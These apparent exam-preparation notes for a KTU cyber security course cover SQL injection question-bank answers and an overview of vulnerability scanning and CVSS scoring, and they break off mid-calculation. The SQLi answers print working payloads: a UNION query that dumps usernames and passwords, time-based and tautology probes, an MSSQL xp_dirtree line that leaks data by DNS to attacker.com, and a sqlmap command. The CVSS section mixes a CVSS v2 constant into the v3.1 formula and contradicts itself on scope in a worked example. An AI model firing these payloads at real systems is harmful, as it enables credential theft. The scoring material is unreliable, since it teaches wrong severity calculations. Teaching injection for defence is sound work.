**(1.4 marks per row × 5 = 7 marks)**

> [!WARNING]
> **Examiner's Pitfall (Part B):** Students often list mitigations but **omit the limitation**. The KTU 2024 rubric explicitly tests whether you understand that *no single mitigation is a silver bullet*. A complete answer always includes a defense-in-depth perspective.

---

### Question B (14 Marks) — Internal Choice Alternative `[KTU University Exam — Dec 2023 Pattern]`

**Q.B.** **(a)** Differentiate between **In-band, Inferential (Blind), and Out-of-band** SQL injection attacks. Give one example payload for each. **(7 marks)**

**(b)** Describe the **UNION-based SQL injection** attack with a worked example. How would you detect it during a penetration test? **(7 marks)**

---

#### Model Solution for Q.B (a) — Three SQLi Types (7 Marks)

**1. In-band SQLi:** The attacker uses the *same* channel to inject the payload and retrieve the data. It is the most common and easiest to exploit. **(2 marks)**
- *Example Payload:* `' UNION SELECT username, password FROM users-- ` injected into a product search field.

**2. Inferential (Blind) SQLi:** The database does not return data directly. The attacker sends payloads and infers information from differences in HTTP response (boolean) or response time (time-based). **(2.5 marks)**
- *Example Payload:* `' AND SLEEP(5)-- ` — if the page loads 5 seconds slower, the input is vulnerable.

**3. Out-of-band SQLi:** Data is exfiltrated through a *different* channel, typically DNS or HTTP requests triggered by DBMS-specific features (e.g., `xp_dirtree` in MSSQL, `UTL_HTTP` in Oracle). Used when in-band and inferential channels are blocked. **(2.5 marks)**
- *Example Payload:* `'; EXEC master..xp_dirtree '\\\\attacker.com\\x'-- ` — the database performs a DNS lookup to the attacker's domain, leaking data in the subdomain.

---

#### Model Solution for Q.B (b) — UNION-based SQLi + Detection (7 Marks)

**Worked Example (5 marks):**

A vulnerable application has a "View Product" page that takes a product ID from the URL:
`https://victim.com/product?id=10`

**Step 1:** The backend builds the query:
`SELECT name, description FROM products WHERE id = 10`

**Step 2:** Attacker injects:
`https://victim.com/product?id=10' UNION SELECT username, password FROM users-- `

**Step 3:** Resulting query:

$$
\begin{aligned}
&\text{SELECT name, description FROM products WHERE id = 10} \\
&\text{UNION} \\
&\text{SELECT username, password FROM users}
\end{aligned}
$$

**Step 4:** The product page now displays usernames in the "name" field and password hashes in the "description" field. The attacker harvests credentials.

**Penetration Test Detection Methods (2 marks):**
- Use `ORDER BY n` payloads to determine the column count and observe error messages.
- Automated tools like **SQLMap** (`sqlmap -u "https://victim.com/product?id=10" --dbs`) automate the discovery and exploitation.
- Look for **verbose database error messages** leaking schema information.

> [!WARNING]
> **Examiner's Pitfall (Part B Choice):** Students confuse the **UNION** keyword with **JOIN**. Recall: `UNION` stacks results of *independent* queries; `JOIN` merges columns from *related* tables. Examiners deduct marks if you use them interchangeably.

---

## Topic Recap & Important Things to Remember

- **Definition:** SQL Injection is the injection of malicious SQL via untrusted input, exploiting string concatenation in dynamic queries. **[High Frequency]**
- **CIA Triad Impact:** SQLi breaks **Confidentiality** (data theft), **Integrity** (data tampering), and **Availability** (data deletion via `DROP`). **[High Frequency]**
- **Three Attack Families:** In-band, Inferential (Blind), Out-of-band. **[High Frequency]**
- **Classic Tautology Payload:** `' OR '1'='1' -- ` — memorize verbatim. **[High Frequency]**
- **UNION Rule:** The injected `SELECT` must return the **same number of columns** as the original query. **[High Frequency]**
- **`--` (double hyphen)** is the SQL **single-line comment operator** — it neutralizes the rest of the legitimate query. **[High Frequency]**
- **Best Mitigation = Defense in Depth:** Combine **Prepared Statements** + **Input Validation** + **Least Privilege** + **WAF**. No single layer is sufficient. **[High Frequency]**
- **Tools to Remember:** `SQLMap` (offensive), `SonarQube` (defensive SAST), `Burp Suite` (interception/testing). **[Medium Frequency]**
- **OWASP A03:2021:** Injection is ranked **3rd** in the OWASP Top 10. **[Medium Frequency]**
- **CWE-89:** The official CWE identifier for SQL Injection. **[Medium Frequency]**
- **Blind SQLi Detection:** Use `SLEEP()`, `BENCHMARK()`, or `WAITFOR DELAY` for time-based inference. **[Medium Frequency]**
- **Out-of-band Mechanism:** MSSQL uses `xp_dirtree`; Oracle uses `UTL_HTTP`; MySQL uses `LOAD_FILE()` and `INTO OUTFILE`. **[Low-Medium Frequency]**
- **Prepared Statement Caveat:** Cannot parameterize **table names, column names, or `ORDER BY` clauses** — use whitelisting for these. **[High Frequency — favorite trick question]**
- **Stored Procedure Caveat:** Secure *only* if they do *not* internally use dynamic SQL concatenation. **[Medium Frequency]**

<!-- SECTION_5_END -->

topics.title: Overview of Vulnerability Scanning
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PEEOT741 - FUNDAMENTALS OF CYBER SECURITY
> - **Module:** Module 4
> - **Topic:** Overview of Vulnerability Scanning

<!-- SECTION_1_START -->
# SECTION 1: Core Technical Definition & Intuitive Overview

## 1.1 Formal Academic Definition

**Vulnerability Scanning** is the systematic, automated, and proactive process of identifying, classifying, and reporting security weaknesses (vulnerabilities) in computer systems, networks, applications, and IT infrastructure. It is performed using specialized software tools called **Vulnerability Scanners** that compare the target's configuration, software versions, and known security flaws against an up-to-date database of vulnerabilities, such as the **Common Vulnerabilities and Exposures (CVE)** list maintained by **MITRE Corporation** and the **National Vulnerability Database (NVD)**.

From the perspective of **Cybersecurity Risk Management**, vulnerability scanning is a foundational pillar of the **Identify** function in the **NIST Cybersecurity Framework (CSF)** and forms the core operational component of the **Vulnerability Management Lifecycle**.

> [!IMPORTANT]
> **KTU Syllabus Highlight (Module 4):** Vulnerability Scanning is a critical pre-requisite to Penetration Testing. It is a **passive-to-active** non-destructive reconnaissance technique that uses databases of known weaknesses, as opposed to Penetration Testing which actively *exploits* those weaknesses to demonstrate impact.

## 1.2 Conceptual Analogy / Intuition

Imagine you are a building inspector hired to check a 50-story apartment complex for fire safety violations before granting an occupancy certificate.

- The **building** = Your organization's IT network, servers, and applications.
- The **fire exits, alarms, sprinklers** = Security controls (firewalls, antivirus, encryption).
- The **vulnerabilities** = Broken fire alarms, blocked exits, expired sprinkler systems, faulty wiring.
- The **Vulnerability Scanner** = The inspection tool (a clipboard with a checklist of every known building code violation).
- The **scan report** = The inspector's written list of issues that must be fixed.

Just as the inspector doesn't actually *start a fire* to test the sprinkler system (that would be a *penetration test*), the vulnerability scanner *identifies* the issues but does not *exploit* them. It simply rings the doorbell to see if it's open, checks if the locks are rusted, and looks at the age of the fire extinguishers.

> [!NOTE]
> **Key Takeaway:** Vulnerability Scanning answers the question, *"What are the doors I forgot to lock?"* — not *"What happens if a thief breaks in?"*

## 1.3 Standard Metrics and Terminology

| Term | Standard Definition | KTU Reference Value |
|------|---------------------|---------------------|
| **CVE** | Common Vulnerabilities and Exposures | Publicly known vulnerability ID (e.g., **CVE-2024-3094**) |
| **CVSS** | Common Vulnerability Scoring System | Score range: **0.0 to 10.0** |
| **NVD** | National Vulnerability Database | Synchronized with CVE |
| **False Positive** | Scanner reports an issue that does not exist | Goal: < 5% |
| **False Negative** | Scanner misses a real vulnerability | Goal: < 2% |
| **Authenticated Scan** | Uses valid credentials for deeper inspection | High accuracy |
| **Unauthenticated Scan** | External attacker perspective | Mimics real threat |

> [!NOTE]
> **CVSS Severity Bands (Standardized by FIRST.org):**
> - **0.0 – 3.9** : Low
> - **4.0 – 6.9** : Medium
> - **7.0 – 8.9** : High
> - **9.0 – 10.0** : Critical

## 1.4 Distinction from Related Concepts

| Concept | Purpose | Destructive? | Frequency |
|---------|---------|--------------|-----------|
| **Vulnerability Scan** | Find known weaknesses | **No** | Weekly/Monthly |
| **Penetration Test** | Exploit weaknesses | **Yes (controlled)** | Quarterly/Annually |
| **Security Audit** | Verify policy compliance | No | Annually |
| **Risk Assessment** | Prioritize business impact | No | Annually |

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# SECTION 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 Operational Workflow of a Vulnerability Scanner

A vulnerability scanner does not magically "see" vulnerabilities. It follows a strict algorithmic workflow:

1. **Asset Discovery (Enumeration):** The scanner sends ICMP pings, ARP requests, and TCP SYN packets to identify live hosts, open ports, and running services. This phase is often called **"Footprinting"** or **"Reconnaissance"**.

2. **Service & Version Detection (Banner Grabbing):** Once a port is open (e.g., port 80 for HTTP, port 22 for SSH), the scanner probes the service to identify its exact software name and version number. It uses techniques like:
   - Reading **service banners** (e.g., `Apache/2.4.41`).
   - Sending **crafted protocol packets** (e.g., HTTP `OPTIONS` request) to elicit version-specific responses.

3. **Vulnerability Database Correlation:** The discovered software signature (e.g., `Apache 2.4.41`) is cross-referenced against a local copy of the **CVE/NVD database**. Each CVE contains a structured description, affected version ranges, and a **CVSS vector**.

4. **Active Probing (Safe Checks):** The scanner may send non-destructive, specially crafted packets to the target to *confirm* the presence of a vulnerability without causing harm. For example, it might send a malformed HTTP header to check if the server crashes (which would indicate a buffer overflow), but it does not execute arbitrary code.

5. **Report Generation:** The tool outputs a structured report listing:
   - The vulnerability ID (CVE-XXXX-XXXX)
   - Severity score (CVSS base score)
   - Affected host
   - Remediation advice (e.g., "Upgrade to Apache 2.4.52 or later")

## 2.2 Classification of Vulnerability Scanning

Vulnerability scans can be classified along three primary dimensions:

### A. Based on the Knowledge of the Target

| Scan Type | Description | Mimics | Tools Used |
|-----------|-------------|--------|------------|
| **Authenticated Scan** | Scanner logs in with valid credentials (read-only) to inspect configuration, patches, registry, and user accounts. | Insider / Privileged User | Nessus, Qualys, OpenVAS |
| **Unauthenticated Scan** | Scanner probes the system from the outside without credentials. It only sees what an external attacker would see. | External Hacker | Nmap (NSE scripts), Nikto |

### B. Based on the Layer of the Stack

| Scan Type | Layer Examined | Example Tool |
|-----------|----------------|--------------|
| **Network-Based Scan** | Layer 2–4: Open ports, running services, OS detection | Nmap, OpenVAS |
| **Host-Based Scan** | Layer 7 + OS Internals: Patch levels, registry, file permissions | Nessus, Lynis |
| **Application-Based Scan** | Web apps, APIs: SQLi, XSS, CSRF, broken auth | OWASP ZAP, Burp Suite |
| **Wireless Scan** | Wi-Fi: Rogue APs, weak encryption (WEP/WPA2) | Aircrack-ng, Kismet |
| **Database Scan** | DBMS: Misconfigurations, default creds, privilege escalation | SQLMap, DbProtect |

### C. Based on the Aggressiveness

| Scan Type | Description | Risk of Disruption |
|-----------|-------------|---------------------|
| **Passive Scan** | Monitors live network traffic (via port mirroring) for vulnerabilities. Never sends packets. | **Zero** |
| **Active Scan** | Sends probes to the target to actively query its state. | **Low to Medium** |
| **Intrusive Scan** | Actively attempts to trigger the vulnerability (e.g., DoS simulation). | **High** (often denied in production) |

## 2.3 The CVSS Scoring Framework (High-Yield for KTU)

The **Common Vulnerability Scoring System (CVSS)** is the industry-standard method to score the severity of a vulnerability. Version **CVSS v3.1** is composed of three metric groups:

### 2.3.1 Base Metrics (Intrinsic qualities of the vulnerability)

The Base Score is calculated using the following formula as defined by **FIRST.org**:

$$ \text{BaseScore} = \text{round}(\text{minimum}((\text{Impact} + \text{Exploitability}), 10) \times f(\text{Impact}) ) $$

Where:
$$ \text{Exploitability} = 8.22 \times \text{AV} \times \text{AC} \times \text{PR} \times \text{UI} $$

$$ \text{Impact} = 6.42 \times (1 - (1 - C) \times (1 - I) \times (1 - A)) $$

**Metric Values (Quantified Coefficients):**

| Metric | Code | Possible Values (Coefficients) |
|--------|------|--------------------------------|
| **Attack Vector (AV)** | Network / Adjacent / Local / Physical | 0.85 / 0.62 / 0.55 / 0.20 |
| **Attack Complexity (AC)** | Low / High | 0.77 / 0.44 |
| **Privileges Required (PR)** | None / Low / High | 0.85 / 0.62 / 0.27 (0.50 if Scope Changed) |
| **User Interaction (UI)** | None / Required | 0.85 / 0.62 |
| **Confidentiality (C)** | None / Low / High | 0 / 0.22 / 0.56 |
| **Integrity (I)** | None / Low / High | 0 / 0.22 / 0.56 |
| **Availability (A)** | None / Low / High | 0 / 0.22 / 0.56 |

> [!NOTE]
> **The function $f(\text{Impact})$** is defined piecewise:
> - If **Impact = 0**, then $f(\text{Impact}) = 0$ (the vulnerability has no impact).
> - Otherwise, $f(\text{Impact}) = 1.176$ (a constant scaling factor defined in the CVSS v3.1 specification).

### 2.3.2 Temporal Metrics (Change over time)

These reflect the current state of exploitation and patch availability:
- **Exploit Code Maturity (E):** Not Defined / Unproven / Proof-of-Concept / Functional / High
- **Remediation Level (RL):** Not Defined / Official Fix / Temporary Fix / Workaround / Unavailable
- **Report Confidence (RC):** Not Defined / Unknown / Reasonable / Confirmed

### 2.3.3 Environmental Metrics (Organization-specific)

These allow the organization to modify the Base Score based on its own infrastructure criticality:
- **Confidentiality Requirement (CR)**
- **Integrity Requirement (IR)**
- **Availability Requirement (AR)**
- **Modified Base Metrics** (to reflect custom environments)

## 2.4 The Vulnerability Management Lifecycle (KTU Favourite)

Vulnerability Scanning is a *continuous process*, not a one-time event. KTU frequently asks about this lifecycle:

1. **Plan & Scope:** Define what systems are in-scope, the scan frequency, and the acceptable time window (maintenance window).
2. **Baseline Inventory:** Maintain an up-to-date inventory of all hardware and software assets (an **Asset Inventory** is mandated by ISO 27001 and NIST 800-53).
3. **Scan Execution:** Run the vulnerability scanner in either **credentialed** or **non-credentialed** mode.
4. **Analysis & Prioritization:** Triage the report. Use **CVSS** + **Asset Criticality** + **Threat Intelligence** to prioritize. A *Critical* CVE on a *production database server* is far more urgent than a *Medium* CVE on a *test laptop*.
5. **Remediation:** Apply patches, reconfigure services, or implement compensating controls (e.g., deploy a WAF if a patch is unavailable).
6. **Verification Re-scan:** Re-run the scanner to confirm the vulnerability has been fixed.
7. **Reporting & Continuous Improvement:** Document the entire process for compliance (PCI-DSS, HIPAA, GDPR).

## 2.5 Real-World Engineering Utility

- **DevSecOps Pipelines:** Modern **CI/CD** pipelines integrate vulnerability scanners (e.g., **Snyk**, **Trivy**, **OWASP Dependency-Check**) directly into the build process. Every code commit is scanned for vulnerable libraries.
- **Cloud Security Posture Management (CSPM):** Tools like **AWS Inspector** and **Azure Defender** continuously scan cloud workloads (EC2, S3, Azure VMs) for misconfigurations and missing patches.
- **Industrial Control Systems (ICS):** Scanners like **Claroty** and **Tenable.ot** are used in SCADA and IoT environments to detect vulnerabilities in **OT (Operational Technology)** networks.
- **Compliance Audits:** **PCI-DSS Requirement 11.3** mandates quarterly external and internal vulnerability scans by an **ASV (Approved Scanning Vendor)**.

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# SECTION 3: Step-by-Step Analytical Derivations & Worked Examples

## 3.1 Worked Example 1: CVSS Base Score Calculation

**Problem:** A web application has a vulnerability with the following CVSS v3.1 Base Metrics:
- **AV** = Network (0.85)
- **AC** = Low (0.77)
- **PR** = None (0.85)
- **UI** = None (0.85)
- **C** = High (0.56)
- **I** = High (0.56)
- **A** = High (0.56)
- **Scope (S)** = Changed (for Impact calculation, we use the values as-is, but for Exploitability, PR becomes 0.50)

**Step 1: Calculate Impact Sub-Score (ISS)**

$$ \text{ISS} = 1 - (1 - C) \times (1 - I) \times (1 - A) $$

Substitute the Confidentiality, Integrity, and Availability coefficients:

$$ \text{ISS} = 1 - (1 - 0.56) \times (1 - 0.56) \times (1 - 0.56) $$

Compute each factor:
- $(1 - 0.56) = 0.44$

Multiply them:

$$ \text{ISS} = 1 - (0.44 \times 0.44 \times 0.44) $$

$$ \text{ISS} = 1 - 0.085184 $$

$$ \text{ISS} = 0.914816 $$

**Step 2: Calculate the Impact component**

The Impact is calculated as:

$$ \text{Impact} = 6.42 \times \text{ISS} $$

Substitute:

$$ \text{Impact} = 6.42 \times 0.914816 $$

$$ \text{Impact} = 5.8723 $$

**Step 3: Calculate the Exploitability Score (ES)**

For Scope = Unchanged, the formula is:

$$ \text{ES} = 8.22 \times \text{AV} \times \text{AC} \times \text{PR} \times \text{UI} $$

Substitute the values:

$$ \text{ES} = 8.22 \times 0.85 \times 0.77 \times 0.85 \times 0.85 $$

Compute step-by-step:
- $8.22 \times 0.85 = 6.987$
- $6.987 \times 0.77 = 5.380$
- $5.380 \times 0.85 = 4.573$
- $4.573 \times 0.85 = 3.887$

$$ \text{ES} \approx 3.887 $$

**Step 4: Apply the Base Score Formula**

For Scope = Unchanged:

$$ \text{BaseScore} = \text{round}(\text{minimum}((\text{Impact} + \text{Exploitability}), 10)) $$

Substitute the computed values:

$$ \text{BaseScore} = \text{round}(\text{minimum}((5.8723 + 3.887), 10)) $$

Add the components:

$$ \text{BaseScore} = \text{round}(\text{minimum}(9.7593, 10)) $$

The minimum is 9.7593, so:

$$ \text{BaseScore} = \text{round}(9.7593) $$

$$ \boxed{\text{BaseScore} = 9.8} $$

**Interpretation:** A score of 9.8 falls into the **Critical (9.0 – 10.0)** band. This vulnerability must be remediated with the highest urgency.

## 3.2 Worked Example 2: False Positive Rate (FPR) Analysis

A security team runs a vulnerability scan against 1,000 corporate laptops.
- The scanner reports **200** vulnerabilities.
- Manual verification reveals that **30** of these reports are false alarms (the vulnerability is not actually present).
- A subsequent **deep-dive audit** finds that the scanner missed **15** real vulnerabilities that were discovered by manual inspection.

**Step 1: Calculate the False Positive Rate (FPR)**

By definition, the False Positive Rate is the proportion of false positives among all positive results reported by the scanner:

$$ \text{FPR} = \frac{FP}{FP + TP} \times 100\% $$

Substitute the values:
- **False Positives (FP)** = 30
- **True Positives (TP)** = Total reported issues − FP = 200 − 30 = 170

$$ \text{FPR} = \frac{30}{30 + 170} \times 100\% $$

$$ \text{FPR} = \frac{30}{200} \times 100\% $$

$$ \text{FPR} = 0.15 \times 100\% $$

$$ \text{FPR} = 15\% $$

**Step 2: Calculate the False Negative Rate (FNR)**

The False Negative Rate is the proportion of actual vulnerabilities that the scanner *missed*:

$$ \text{FNR} = \frac{FN}{FN + TP} \times 100\% $$

Substitute the values:
- **False Negatives (FN)** = 15
- **True Positives (TP)** = 170

$$ \text{FNR} = \frac{15}{15 + 170} \times 100\% $$

$$ \text{FNR} = \frac{15}{185} \times 100\% $$

$$ \text{FNR} \approx 0.0811 \times 100\% $$

$$ \text{FNR} \approx 8.11\% $$

**Step 3: Calculate the Detection Rate (Recall)**

The Detection Rate (also called *Recall* or *True Positive Rate*) measures the scanner's ability to find all real vulnerabilities:

$$ \text{Recall} = \frac{TP}{TP + FN} \times 100\% $$

$$ \text{Recall} = \frac{170}{170 + 15} \times 100\% $$

$$ \text{Recall} = \frac{170}{185} \times 100\% $$

$$ \text{Recall} \approx 91.89\% $$

> [!NOTE]
> **Engineering Insight:** A high FPR (like 15% in our example) causes "alert fatigue" for the security team. Modern scanners (e.g., **Tenable Nessus** with **Nessus Plugins**) aim for FPR < 5%. The FNR is more dangerous because it represents *undiscovered* real threats.

## 3.3 Worked Example 3: Asset Prioritization Matrix

A mid-sized company identifies three vulnerabilities across three assets during a scan:

| Asset | Asset Criticality (1–5) | CVE Found | CVSS Base Score |
|-------|--------------------------|-----------|-----------------|
| Public Web Server | 5 (Mission Critical) | CVE-2024-A | 6.5 (Medium) |
| Internal Print Server | 1 (Low Value) | CVE-2024-B | 9.1 (Critical) |
| Employee Workstation | 3 (Medium) | CVE-2024-C | 7.5 (High) |

The security team uses a custom **Risk Priority Number (RPN)** formula:

$$ \text{RPN} = \text{CVSS} \times \text{Asset Criticality} $$

Compute the RPN for each asset:
- **Public Web Server:** $\text{RPN} = 6.5 \times 5 = 32.5$
- **Internal Print Server:** $\text{RPN} = 9.1 \times 1 = 9.1$
- **Employee Workstation:** $\text{RPN} = 7.5 \times 3 = 22.5$

**Prioritization Order:** Public Web Server (32.5) > Employee Workstation (22.5) > Internal Print Server (9.1).

> [!IMPORTANT]
> **Counter-intuitive Insight:** Even though the Print Server has a **Critical** CVSS score (9.1), it has the **lowest priority** because it is an isolated, low-value asset. This demonstrates the **risk = threat × vulnerability × impact** philosophy in modern cybersecurity.

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# SECTION 4: Structural Diagrams & Schematics

## 4.1 Mermaid Flowchart: The Vulnerability Scanning Process

The following Mermaid diagram illustrates the complete operational workflow of a vulnerability scanner, from the initial setup to the final remediation re-scan:

```mermaid
flowchart TD
    nodeA([Start: Define Scope]) --> nodeB[Asset Discovery / Network Enumeration]
    nodeB --> nodeC{Authenticated Scan?}
    nodeC -- Yes --> nodeD[Login with Read-Only Credentials]
    nodeC -- No --> nodeE[Proceed as External Attacker]
    nodeD --> nodeF[Service and Version Detection]
    nodeE --> nodeF
    nodeF --> nodeG[Banner Grabbing and OS Fingerprinting]
    nodeG --> nodeH[Cross-Reference with CVE and NVD Database]
    nodeH --> nodeI{Vulnerability Found?}
    nodeI -- No --> nodeJ([Report: Target is Clean])
    nodeI -- Yes --> nodeK[Perform Safe Active Check]
    nodeK --> nodeL{Confirmed?}
    nodeL -- No --> nodeM[Mark as Possible / Investigate]
    nodeL -- Yes --> nodeN[Assign CVSS Base Score]
    nodeN --> nodeO[Add to Report with Remediation Steps]
    nodeM --> nodeO
    nodeO --> nodeP[Prioritize by CVSS and Asset Criticality]
    nodeP --> nodeQ[Apply Patch or Compensating Control]
    nodeQ --> nodeR[Verification Re-Scan]
    nodeR --> nodeS{Vulnerability Resolved?}
    nodeS -- No --> nodeQ
    nodeS -- Yes --> nodeT([Generate Final Compliance Report])
```

## 4.2 Mermaid Block Diagram: Block-Level Functional Architecture of a Vulnerability Scanner

This block diagram represents the internal functional architecture of a typical commercial vulnerability scanner (e.g., Nessus, Qualys, OpenVAS):

```mermaid
flowchart LR
    subgraph inputLayer["INPUT LAYER"]
        inputA[Network Probe Engine]
        inputB[Host Configuration Collector]
        inputC[Crawl and Fingerprint Engine]
    end

    subgraph processingLayer["PROCESSING LAYER"]
        procA[CVE and NVD Database]
        procB[Signature Matching Engine]
        procC[CVSS Scoring Calculator]
        procD[False Positive Filter]
    end

    subgraph outputLayer["OUTPUT LAYER"]
        outA[Vulnerability Report Generator]
        outB[Remediation Advisor]
        outC[Compliance Mapping Engine]
        outD[Dashboard and API Output]
    end

    inputA --> procA
    inputB --> procA
    inputC --> procA
    procA --> procB
    procB --> procC
    procC --> procD
    procD --> outA
    procD --> outB
    procD --> outC
    outA --> outD
    outB --> outD
    outC --> outD
```

> [!NOTE]
> **Diagram Interpretation:** The **INPUT LAYER** gathers raw data from the target. The **PROCESSING LAYER** cross-references the data with a known-vulnerability database and assigns severity. The **OUTPUT LAYER** produces human-readable reports, remediation advice, and maps the findings to compliance frameworks (PCI-DSS, HIPAA, ISO 27001).

## 4.3 Mermaid Diagram: Comparison of Scanning vs. Penetration Testing

This diagram clarifies the strategic relationship between the two techniques:

```mermaid
flowchart TD
    start([Organization Decides to Assess Security]) --> decision{Assessment Goal?}
    decision -- Identify ALL known weaknesses --> vuln[Vulnerability Scan]
    decision -- Exploit specific weaknesses to prove impact --> pen[Penetration Test]
    vuln --> vulnRes[Output: List of CVEs with CVSS Scores]
    pen --> penRes[Output: Proof-of-Concept Exploit and Business Impact Report]
    vulnRes --> rem1[Apply Patches]
    penRes --> rem2[Critical Patches plus Strategic Security Improvements]
```

> [!IMPORTANT]
> **Key Distinction:** Vulnerability scanning is **breadth-first** (catches many issues, low depth), while penetration testing is **depth-first** (catches few issues, very high depth). Best practice is to use **scanning continuously** and **penetration testing periodically**.

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
# SECTION 5: KTU 2024 Scheme Examination Question Bank & Topic Recap

## PART A: Short Answer Questions (2 x 3 = 6 Marks)

### **Question 1: Define Vulnerability Scanning. List any four common vulnerability scanning tools.** `[KTU University Exam - May 2024, Similar Pattern]`

**Model Answer:**

**Definition:**
Vulnerability scanning is the automated process of identifying, classifying, and reporting security weaknesses in computer systems, networks, and applications by comparing the target's configuration and software versions against a database of known vulnerabilities such as CVE.

**Four Common Tools:**
1. **Nessus** (by Tenable) – Industry standard for commercial vulnerability scanning.
2. **OpenVAS** (Greenbone) – Open-source network vulnerability scanner.
3. **QualysGuard** (by Qualys) – Cloud-based enterprise scanner.
4. **Nmap** (with NSE scripts) – Network mapper with vulnerability detection scripts.
5. *(Bonus)* **OWASP ZAP** – Specialized for web application vulnerability scanning.

---

### **Question 2: Differentiate between Authenticated and Unauthenticated Vulnerability Scans.** `[KTU University Exam - Dec 2023, Modified]`

**Model Answer:**

| Parameter | Authenticated Scan | Unauthenticated Scan |
|-----------|-------------------|----------------------|
| **Credentials** | Uses valid read-only login credentials | No credentials used |
| **Perspective** | Insider / Privileged user view | External attacker view |
| **Visibility** | Sees patches, registry, local configs, user accounts | Sees only externally exposed services |
| **Accuracy** | Higher (fewer false positives) | Lower (more false positives) |
| **Use Case** | Internal network, compliance audits | Perimeter defense, external exposure |
| **Tools** | Nessus (with creds), Qualys | Nmap, Nikto |

---

## PART B: Long Answer Questions (Module Internal Choice - 1 x 14 = 14 Marks)

> [!WARNING]
> **KTU Examiner's Valuation Warning:** Students often lose marks by *defining* terms without *explaining the purpose, workflow, and real-world context*. Always include a structured workflow diagram or a comparative table in 14-mark questions. Memorization-only answers will be capped at 8/14.

---

### **Question A (Choice 1):**

#### **(a) [7 Marks] Explain the complete Vulnerability Management Lifecycle in detail. Why is continuous scanning preferred over one-time scanning?**

**Model Solution:**

The **Vulnerability Management Lifecycle** is a continuous, closed-loop process used by organizations to identify, evaluate, treat, and report on security vulnerabilities. It is mandated by frameworks such as **NIST SP 800-40** and **ISO 27001**.

**Stage 1: Planning and Asset Inventory (2 marks)**
- Define the scope: Identify all hardware, software, and network assets in-scope.
- Maintain an accurate **CMDB (Configuration Management Database)**.
- Classify assets by **criticality** (e.g., Tier-1 production server vs. Tier-4 test laptop).

**Stage 2: Vulnerability Scanning Execution (2 marks)**
- Run scanners in both **credentialed** (for depth) and **non-credentialed** (for external view) modes.
- Use multiple scanning tools to cross-validate results.
- Schedule scans during **maintenance windows** to avoid production disruption.

**Stage 3: Analysis and Prioritization (2 marks)**
- Triage findings using **CVSS v3.1 Base Score + Environmental Score**.
- Incorporate **Threat Intelligence Feeds** (e.g., MITRE ATT&CK, CISA KEV Catalog) to prioritize actively exploited vulnerabilities.
- Calculate a **Risk Priority Number (RPN)** by combining CVSS with asset criticality.

**Stage 4: Remediation and Re-Scanning (1 mark)**
- Apply patches, change configurations, or deploy compensating controls (WAF, IPS).
- Perform a **verification re-scan** to confirm the fix.

**Why Continuous Scanning is Preferred (Bonus Point):**
- **Zero-day vulnerabilities** are discovered daily (e.g., **CVE-2024-3094** in XZ Utils). A one-time scan becomes obsolete within weeks.
- **New assets** (containers, cloud VMs) are provisioned constantly, expanding the attack surface.
- **Configuration drift** occurs when admins make changes without security review.
- Continuous scanning aligns with **DevSecOps** and **Shift-Left Security** principles.

#### **(b) [7 Marks] With a neat diagram, explain the architecture of a typical vulnerability scanner. List the major components.**

**Model Solution:**

A typical vulnerability scanner consists of **three functional layers**:

**Layer 1: Discovery Engine (Input Layer) (2 marks)**
- **Network Probe Engine:** Sends ICMP, TCP SYN, UDP packets to identify live hosts and open ports.
- **Host Configuration Collector:** When authenticated, retrieves patch levels, registry values, installed software, and running processes.
- **Crawl and Fingerprint Engine:** Performs banner grabbing (e.g., `HTTP Server: Apache/2.4.41`) and OS fingerprinting (TCP/IP stack analysis).

**Layer 2: Analysis Engine (Processing Layer) (3 marks)**
- **CVE/NVD Database:** A locally synchronized copy of known vulnerabilities, typically updated daily via feeds.
- **Signature Matching Engine:** Compares discovered software versions and configurations against the database entries.
- **CVSS Scoring Calculator:** Automatically computes the Base, Temporal, and Environmental scores for each match.
- **False Positive Filter:** Uses heuristics, machine learning, or whitelists to reduce noise.

**Layer 3: Reporting Engine (Output Layer) (2 marks)**
- **Vulnerability Report Generator:** Produces executive summaries and technical deep-dives.
- **Remediation Advisor:** Suggests patches, configuration changes, or compensating controls.
- **Compliance Mapping Engine:** Maps findings to **PCI-DSS, HIPAA, ISO 27001, NIST 800-53**.
- **Dashboard and API:** Provides real-time visibility via web UI and integration with SIEM/SOAR tools.

**Neat Diagram (to be drawn in the exam):**

```
┌──────────────────────┐  ┌──────────────────────┐  ┌──────────────────────┐
│  DISCOVERY ENGINE    │  │   ANALYSIS ENGINE    │  │   REPORTING ENGINE   │
│ • Network Probe      │→ │ • CVE/NVD Database   │→ │ • Report Generator   │
│ • Host Collector     │  │ • Signature Matcher  │  │ • Remediation Advisor│
│ • Fingerprinter      │  │ • CVSS Calculator    │  │ • Compliance Mapper  │
│                      │  │ • False Positive     │  │ • Dashboard / API    │
│                      │  │   Filter             │  │                      │
└──────────────────────┘  └──────────────────────┘  └──────────────────────┘
```

---

### **Question B (Choice 2 - Alternative):**

#### **(a) [7 Marks] Explain the CVSS v3.1 scoring framework. Calculate the Base Score for a vulnerability with AV:Network, AC:Low, PR:None, UI:None, C:High, I:High, A:None, Scope:Unchanged.**

**Model Solution:**

**CVSS v3.1 Framework Overview (4 marks):**

The **Common Vulnerability Scoring System (CVSS)** is a free, open-industry standard maintained by **FIRST.org** to assess the severity of computer security vulnerabilities. It consists of three metric groups:

1. **Base Metrics:** Intrinsic characteristics of the vulnerability (constant over time and environment).
2. **Temporal Metrics:** Characteristics that change over time (e.g., availability of exploit code, official patches).
3. **Environmental Metrics:** Organization-specific considerations (e.g., criticality of the affected asset).

**The Base Metrics include:**
- **Exploitability Metrics:** Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI), Scope (S).
- **Impact Metrics:** Confidentiality (C), Integrity (I), Availability (A).

**Step-by-Step Calculation (3 marks):**

**Given:**
- AV:Network = 0.85
- AC:Low = 0.77
- PR:None = 0.85
- UI:None = 0.85
- C:High = 0.56
- I:High = 0.56
- A:None = 0
- Scope:Unchanged

**Step 1: Calculate Impact Sub-Score (ISS)**

$$ \text{ISS} = 1 - (1 - C) \times (1 - I) \times (1 - A) $$

$$ \text{ISS} = 1 - (1 - 0.56) \times (1 - 0.56) \times (1 - 0) $$

$$ \text{ISS} = 1 - 0.44 \times 0.44 \times 1 $$

$$ \text{ISS} = 1 - 0.1936 $$

